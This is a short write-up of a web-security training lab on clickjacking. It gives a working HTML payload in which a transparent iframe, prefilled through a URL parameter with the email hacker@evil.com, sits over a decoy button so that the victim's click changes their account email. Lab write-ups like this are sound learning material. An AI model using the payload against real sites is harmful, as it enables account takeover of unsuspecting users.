## Lab 02: Clickjacking with Form Input Data Prefilled from a URL Parameter

### Context
 
This lab adds one piece on top of the basic technique: the email field in the account page can be prepopulated using a query parameter in the URL. So instead of just clicking a button that does one static thing, the attacker can control the value that gets submitted when the victim clicks.
 
```
https://LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com
```
 
Loading this URL inside the iframe means the email field is already filled in with the attacker's value before the victim does anything. The victim just needs to click Update email.
 
### The Payload
 
```html
<style>
iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}
 
div {
    position: absolute;
    top: 520px;
    left: 70px;
    z-index: 1;
}
</style>
 
<div>Click me</div>
 
<iframe src="https://LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com"></iframe>
```
 
### What Changes Compared to Lab 01
 
The iframe src now includes the email parameter. The page loads with the attacker's email already in the field. Everything else is the same: transparent iframe, decoy div positioned over the target button, victim clicks the decoy and triggers the real button.
 
### Result
 
Victim clicked the decoy. Click hit the Update email button inside the iframe. Email changed to hacker@evil.com. Lab solved.
 
